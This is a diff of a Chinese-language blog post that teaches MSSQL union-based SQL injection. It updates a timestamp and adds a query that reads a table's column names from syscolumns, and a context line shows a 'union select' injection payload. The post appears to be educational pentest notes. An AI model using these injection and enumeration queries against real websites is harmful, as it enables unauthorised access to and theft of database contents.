@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2018-09-04 10:45:01
- * @LastEditTime: 2019-05-09 15:37:13
+ * @LastEditTime: 2019-05-13 15:14:27
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -75,9 +75,15 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ```
 ![80](/img/post/20180904-151551.png)
 
-* 得到数据库test的表article的所有列名（先得到article的表id，然后得到列名）
-![60](/img/post/20180904-112859.png)
-![75](/img/post/20180904-112938.png)
+* 得到数据库test的表article的所有列名
+    * 可以分两步：先得到article的表id，然后得到列名
+    ![60](/img/post/20180904-112859.png)
+    ![75](/img/post/20180904-112938.png)
+
+    * <f>也可直接一条命令直接得到列信息</f>
+    ```
+    select id,name from syscolumns where id=(select id from sysobjects where name='msg');
+    ```
 
 * 得到数据库test的表article的数据
 ![75](/img/post/20180904-113720.png)
